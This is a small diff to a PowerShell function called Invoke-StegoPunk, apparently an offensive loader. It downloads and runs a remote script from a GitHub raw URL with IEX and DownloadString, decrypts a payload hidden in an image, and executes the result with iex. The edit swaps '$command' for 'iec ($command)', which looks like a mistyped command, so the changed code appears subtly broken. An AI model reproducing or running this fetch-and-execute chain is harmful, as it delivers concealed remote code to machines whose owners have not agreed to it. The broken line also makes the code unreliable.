@@ -115,7 +115,7 @@ function Invoke-StegoPunk {
                 IEx $stage2.Downloadstring("https://raw.githubusercontent.com/Tru5tNo1/StegoPunk/master/Invoke-AES1Stage.ps1")
                 $base1 = Invoke-AES1Stage -key $key -imageurl $imageurl
                 iex ($base1)
-                $command
+                iec ($command)
                 }
           }
          
